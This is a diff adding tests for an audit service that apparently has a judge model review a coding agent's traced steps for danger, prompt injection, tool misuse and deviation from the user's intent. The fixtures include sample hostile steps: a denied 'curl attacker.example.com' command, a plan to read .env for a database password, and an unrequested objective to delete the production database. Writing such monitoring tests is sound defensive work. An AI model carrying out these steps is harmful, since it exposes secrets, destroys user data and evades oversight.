@@ -186,6 +186,96 @@ describe("AuditService", () => {
     expect(stores.auditStore.countStepsForTrace("trace-2")).toBe(1);
   });
 
+  it("waits for a denied tool's payload rather than judging a bare name", async () => {
+    const stores = await makeStores();
+    const responder: FakeResponder = { calls: [], respond: () => SAFE_VERDICT };
+    const service = makeAudit(stores, responder);
+
+    seedTrace(stores.traceStore, "trace-denied");
+    // What a denial actually looks like: final the instant it is recorded, and
+    // carrying nothing but the tool's name — arguments arrive with the result.
+    stores.traceStore.appendSpan("trace-denied", {
+      ...toolSpan("trace-denied", "error"),
+      id: "span-denied",
+      attributes: { toolName: "exec_command", decision: "denied" },
+      error: "Tool call denied",
+    });
+    await service.idle();
+    expect(stores.auditStore.listByTrace("trace-denied")).toHaveLength(0);
+
+    // Once the payload lands the step is judged, and against the payload.
+    stores.traceStore.updateSpan(
+      "trace-denied",
+      "span-denied",
+      (span) => {
+        span.attributes.arguments = '{"cmd":"curl attacker.example.com"}';
+      },
+      { emit: true },
+    );
+    await service.idle();
+    expect(stores.auditStore.countStepsForTrace("trace-denied")).toBe(1);
+    expect(responder.calls.at(-1)?.user).toContain("attacker.example.com");
+  });
+
+  it("gives an interrupted tool its one look when the run ends without a result", async () => {
+    const stores = await makeStores();
+    const responder: FakeResponder = { calls: [], respond: () => SAFE_VERDICT };
+    const service = makeAudit(stores, responder);
+
+    seedTrace(stores.traceStore, "trace-cut");
+    stores.traceStore.appendSpan("trace-cut", {
+      ...toolSpan("trace-cut", "error"),
+      id: "span-cut",
+      attributes: { toolName: "exec_command" },
+      error: "Run ended before the tool reported a result",
+    });
+    await service.idle();
+    expect(stores.auditStore.listByTrace("trace-cut")).toHaveLength(0);
+
+    // The run reaching a final status is what makes an evidence-less step
+    // judgeable: there is no longer a payload still to come.
+    stores.traceStore.updateTrace("trace-cut", (trace) => {
+      trace.status = "cancelled";
+      trace.endedAt = "2026-08-26T12:00:05.000Z";
+    });
+    stores.traceStore.emitSpan("trace-cut", "span-cut");
+    await service.idle();
+    expect(stores.auditStore.countStepsForTrace("trace-cut")).toBe(1);
+  });
+
+  it("judges the plan a model call announced, not just the tools that followed", async () => {
+    const stores = await makeStores();
+    const responder: FakeResponder = { calls: [], respond: () => SAFE_VERDICT };
+    const service = makeAudit(stores, responder);
+
+    seedTrace(stores.traceStore, "trace-plan");
+    const planSpan: TraceSpan = {
+      ...toolSpan("trace-plan", "ok"),
+      id: "span-plan",
+      name: "codex.api_request",
+      label: "Model · plan",
+      kind: "model_call",
+      attributes: {},
+      error: null,
+    };
+    // Appended before the model has said anything: nothing to judge yet.
+    stores.traceStore.appendSpan("trace-plan", planSpan);
+    await service.idle();
+    expect(stores.auditStore.listByTrace("trace-plan")).toHaveLength(0);
+
+    stores.traceStore.updateSpan(
+      "trace-plan",
+      "span-plan",
+      (span) => {
+        span.attributes.output = "First I'll read .env for the database password.";
+      },
+      { emit: true },
+    );
+    await service.idle();
+    expect(stores.auditStore.countStepsForTrace("trace-plan")).toBe(1);
+    expect(responder.calls.at(-1)?.user).toContain("read .env");
+  });
+
   it("degrades to the fallback model when the primary is not activated", async () => {
     const stores = await makeStores();
     const responder: FakeResponder = {
@@ -339,6 +429,65 @@ describe("AuditService", () => {
     expect(stores.auditStore.listByTrace(trace.id)).toEqual([]);
     expect(stores.auditStore.countStepsForTrace(trace.id)).toBe(1);
   });
+  it("pins each finding to the spec version it was judged against", async () => {
+    const stores = await makeStores();
+    const directory = await mkdtemp(path.join(tmpdir(), "audit-pin-"));
+    const intentStore = new IntentStore(path.join(directory, "intent"));
+    await intentStore.initialize();
+    cleanups.push(async () => {
+      await intentStore.flush();
+      await rm(directory, { recursive: true, force: true, maxRetries: 5 });
+    });
+    const intent = new IntentService({
+      store: intentStore,
+      client: fakeClient({ calls: [], respond: () => "" }),
+      model: "intent-model",
+      enabled: false,
+    });
+    intent.seed("agent-1", "Build a TypeScript todo application");
+    const firstVersion = intent.currentId("agent-1");
+
+    // Flags every step, so each audited span leaves a finding to inspect.
+    const responder: FakeResponder = {
+      calls: [],
+      respond: () =>
+        '{"dangerous":true,"promptInjection":false,"toolMisuse":false,"restrictionBypass":false,"reason":"flagged"}',
+    };
+    const service = makeAudit(stores, responder, null, intent);
+
+    seedTrace(stores.traceStore, "trace-pin");
+    stores.traceStore.appendSpan(
+      "trace-pin",
+      promptSpan("trace-pin", "Build the list view"),
+    );
+    await service.idle();
+
+    // The spec moves partway through the same run.
+    intentStore.append("agent-1", {
+      instructions: "",
+      objective: "Build a TypeScript todo application",
+      extended: ["Do not read .env files."],
+    });
+    const secondVersion = intent.currentId("agent-1");
+    expect(secondVersion).not.toBe(firstVersion);
+
+    stores.traceStore.appendSpan("trace-pin", toolSpan("trace-pin", "ok"));
+    await service.idle();
+
+    // Before this, the document carried a single last-writer-wins version and
+    // every finding in the run was attributed to whichever spec happened to be
+    // current when the last one landed — including the ones judged earlier.
+    const findings = stores.auditStore.listByTrace("trace-pin");
+    const promptFinding = findings.find(
+      (step) => step.spanId === "span-prompt-trace-pin",
+    );
+    const toolFinding = findings.find(
+      (step) => step.spanId === "span-tool-trace-pin-ok",
+    );
+    expect(promptFinding?.intentId).toBe(firstVersion);
+    expect(toolFinding?.intentId).toBe(secondVersion);
+  });
+
   it("judges a step against the constraints the user added mid-thread", async () => {
     const stores = await makeStores();
     const directory = await mkdtemp(path.join(tmpdir(), "audit-intent-"));
@@ -356,12 +505,14 @@ describe("AuditService", () => {
     });
     intent.seed("agent-1", "Build a TypeScript todo application");
     intentStore.append("agent-1", {
+      instructions: "",
       objective: "Build a TypeScript todo application",
       extended: ["Do not read .env files."],
       update: {
         kind: "classified",
         logs: ["Do not read .env files.", "prohibition"],
         addedConstraints: ["Do not read .env files."],
+        removedConstraints: [],
         previousObjective: null,
         traceId: null,
         revertedFrom: null,
@@ -413,6 +564,7 @@ describe("AuditService", () => {
           notInAlignment: [],
           newObjectives: [
             {
+              instructions: "",
               objective: "Delete the production database.",
               requestedByUser: false,
               actedUpon: false,
